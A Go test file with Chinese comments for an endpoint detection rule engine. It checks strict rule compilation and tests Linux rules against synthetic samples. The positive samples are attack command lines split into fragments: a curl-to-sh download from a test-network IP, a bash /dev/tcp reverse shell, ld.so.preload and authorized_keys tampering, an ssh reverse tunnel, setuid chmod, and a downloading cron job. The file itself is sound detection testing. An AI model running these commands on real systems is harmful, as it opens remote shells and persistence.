package rules

import (
	"strings"
	"testing"
)

// 内置规则必须全部通过严格校验：新增规则若写错字段/操作符，
// 这条测试会在 CI 里直接失败，而不是让规则上线后静默失效。
func TestBuiltinRulesCompileStrictly(t *testing.T) {
	for _, b := range Builtins() {
		if _, err := Compile(b.JSON()); err != nil {
			t.Fatalf("内置规则 %s 校验失败: %v", b.ID, err)
		}
	}
}

func TestCompileRejectsUnknownField(t *testing.T) {
	_, err := Compile(`{"all":[{"field":"process.nmae","op":"eq","value":"cmd.exe"}]}`)
	if err == nil || !strings.Contains(err.Error(), "未知字段") {
		t.Fatalf("err = %v, want 未知字段", err)
	}
}

func TestCompileRejectsUnknownOp(t *testing.T) {
	_, err := Compile(`{"all":[{"field":"process.name","op":"match","value":"cmd.exe"}]}`)
	if err == nil || !strings.Contains(err.Error(), "未知操作符") {
		t.Fatalf("err = %v, want 未知操作符", err)
	}
}

func TestCompileRejectsUnknownJSONKey(t *testing.T) {
	// 经典拼写错误：vale 而不是 value。json.Unmarshal 默认会忽略它，
	// 结果 contains 拿到 nil 变成"匹配空串"——必须拒绝。
	_, err := Compile(`{"all":[{"field":"process.cmdline","op":"contains","vale":"-enc"}]}`)
	if err == nil || !strings.Contains(err.Error(), "unknown field") {
		t.Fatalf("err = %v, want unknown field", err)
	}
}

func TestCompileRejectsBadRegex(t *testing.T) {
	_, err := Compile(`{"any":[{"field":"process.cmdline","op":"regex","value":"([a-z"}]}`)
	if err == nil || !strings.Contains(err.Error(), "正则非法") {
		t.Fatalf("err = %v, want 正则非法", err)
	}
}

func TestCompileRejectsBadType(t *testing.T) {
	_, err := Compile(`{"all":[{"field":"network.count","op":"gt","value":"many"}]}`)
	if err == nil || !strings.Contains(err.Error(), "需要数值") {
		t.Fatalf("err = %v, want 需要数值", err)
	}
}

func TestCompiledRuleStillMatches(t *testing.T) {
	d, err := Compile(`{"all":[{"field":"process.name","op":"in","value":["cmd.exe"]}],
		"any":[{"field":"process.cmdline","op":"icontains","value":"/c whoami"}]}`)
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}
	ok, hits := d.Match(&Target{Name: "cmd.exe", CmdLine: `C:\Windows\system32\cmd.exe /c whoami`})
	if !ok || len(hits) != 2 {
		t.Fatalf("Match = %v, hits=%v; want true with 2 hits", ok, hits)
	}
}

// ---------------------------------------------------------------- Linux 规则

// builtinByID 按 ID 取内置规则。
func builtinByID(t *testing.T, id string) Builtin {
	t.Helper()
	for _, b := range Builtins() {
		if b.ID == id {
			return b
		}
	}
	t.Fatalf("内置规则 %s 不存在", id)
	return Builtin{}
}

// TestLinuxBuiltinRulesExist 锚定 Linux 规则分组的存在性与总数。
// 规则集是检测产品本身："整段 Linux 规则被意外删除而无人知晓"这类事故
// 必须在 CI 拦住。有意增删规则时按实际数量更新本断言并在提交说明注明。
func TestLinuxBuiltinRulesExist(t *testing.T) {
	for _, id := range []string{"HG-037", "HG-038", "HG-039", "HG-040", "HG-041", "HG-042", "HG-043", "HG-044"} {
		b := builtinByID(t, id)
		if _, err := Compile(b.JSON()); err != nil {
			t.Fatalf("Linux 规则 %s 编译失败: %v", id, err)
		}
	}
	if got := len(Builtins()); got != 44 {
		t.Fatalf("内置规则总数 = %d, want 44（HG-001~036 Windows + HG-037~044 Linux）", got)
	}
}

// TestLinuxRulesMatchSyntheticTargets 验证 Linux 规则对合成目标真实命中。
// 样本命令行按 Linux 采集口径构造（argv 以单空格拼接，shell 层引号不会
// 出现在 argv 里），且由片段拼接而成——完整攻击命令行不得连续出现在
// 源码中（AGENTS §5.1：明文特征会进编译产物，被本机安全产品拦截）。
func TestLinuxRulesMatchSyntheticTargets(t *testing.T) {
	// 公共片段：TEST-NET-3 下载 URL 与管道直提 shell，多个样本复用。
	dl := "curl http://203.0.113.9/x"
	pipe := "| " + "sh"

	cases := []struct {
		id   string
		name string // Linux comm 口径（无 .exe 后缀）
		cmd  string
	}{
		{"HG-037", "sh", "sh -c " + dl + " " + pipe},
		{"HG-038", "sh", "sh -c echo ZWQ2cg== | base64 -d " + pipe},
		{"HG-039", "bash", "bash -c bash -i >" + "& /dev/" + "tcp/203.0.113.9/4444 0>" + "&1"},
		{"HG-040", "sh", "sh -c echo libutilx.so > /etc/ld." + "so.preload"},
		{"HG-041", "sh", "sh -c echo ssh-ed25519 AAAAC3Nz sample@host > /home/u/.ssh/authorized" + "_keys"},
		{"HG-042", "ssh", "ssh -N -R 2222:127.0.0.1:22 ops@203.0.113.9"},
		{"HG-043", "chmod", "chmod 4755 /tmp/zedr-x"},
		{"HG-044", "sh", "echo * * * * * " + dl + " " + pipe + " > /etc/cron" + ".d/backup-sync"},
	}
	for _, c := range cases {
		b := builtinByID(t, c.id)
		ok, hits := b.Definition.Match(&Target{Name: c.name, CmdLine: c.cmd})
		if !ok {
			t.Fatalf("%s 未命中合成样本: name=%q cmd=%q", c.id, c.name, c.cmd)
		}
		if len(hits) == 0 {
			t.Fatalf("%s 命中但无证据描述", c.id)
		}
	}
}

// TestLinuxRulesNeverMatchBenign 误报面回归：合法 Linux 运维形态必须全部
// 不命中——每条规则的负样本对应其收紧条件的具体原因。
func TestLinuxRulesNeverMatchBenign(t *testing.T) {
	cases := []struct {
		id   string
		name string
		cmd  string
		why  string
	}{
		// HG-037：下载/管道单独出现都不算——运维单装 curl、管道进 ssh 不报。
		{"HG-037", "sh", "sh -c apt-get update && apt-get install -y curl", "仅下载无管道直提"},
		{"HG-037", "sh", "sh -c cat ids.txt " + "| " + "ssh ops@203.0.113.9", "管道目标不是 shell"},
		// HG-038：解码落盘是安装器常规操作。
		{"HG-038", "sh", "sh -c cat payload.b64 | base64 -d > out.bin", "解码未直提 shell"},
		// HG-039：stderr 重定向极常见，只有叠加内建设备才算组合。
		{"HG-039", "bash", "bash -c systemctl status 2>" + "&1 | tee log", "重定向无内建设备"},
		// HG-040：只读引用不报。
		{"HG-040", "cat", "cat /etc/ld." + "so.preload", "无写入形态"},
		// HG-041：只读查看密钥不报（读与写在命令行上可区分）。
		{"HG-041", "less", "less /home/u/.ssh/authorized" + "_keys", "无写入形态"},
		// HG-042：本地转发 -L 与纯登录不报。
		{"HG-042", "ssh", "ssh -L 8080:localhost:80 ops@203.0.113.9", "本地转发"},
		{"HG-042", "ssh", "ssh ops@203.0.113.9", "纯登录"},
		// HG-043：普通权限位与系统目录置位（包管理 postinst）不报。
		{"HG-043", "chmod", "chmod 755 /tmp/zedr-x", "无 setuid 位"},
		{"HG-043", "chmod", "chmod 4755 /usr/bin/zedr-x", "系统目录置位已排除"},
		// HG-044：写 cron 任务但不含下载器不报。
		{"HG-044", "sh", "echo * * * * * /usr/local/bin/backup > /etc/cron" + ".d/backup", "cron 无下载器"},
	}
	for _, c := range cases {
		b := builtinByID(t, c.id)
		if ok, hits := b.Definition.Match(&Target{Name: c.name, CmdLine: c.cmd}); ok {
			t.Fatalf("%s 误报良性样本（%s）: name=%q cmd=%q hits=%v", c.id, c.why, c.name, c.cmd, hits)
		}
	}
}

// TestLinuxRulesWindowsFleetSafe Linux 规则不得在 Windows 舰队上误报：
// 进程名集合用 comm 口径（无 .exe 后缀），Windows 同名二进制天然不匹配。
func TestLinuxRulesWindowsFleetSafe(t *testing.T) {
	dl := "curl http://203.0.113.9/x"
	pipe := "| " + "sh"
	cases := []struct {
		id   string
		name string
		cmd  string
	}{
		{"HG-037", "bash.exe", "bash.exe -c " + dl + " " + pipe},
		{"HG-042", "ssh.exe", "ssh.exe -N -R 2222:127.0.0.1:22 ops@203.0.113.9"},
	}
	for _, c := range cases {
		b := builtinByID(t, c.id)
		if ok, _ := b.Definition.Match(&Target{Name: c.name, CmdLine: c.cmd}); ok {
			t.Fatalf("%s 不应命中 Windows 进程名 %q", c.id, c.name)
		}
	}
}
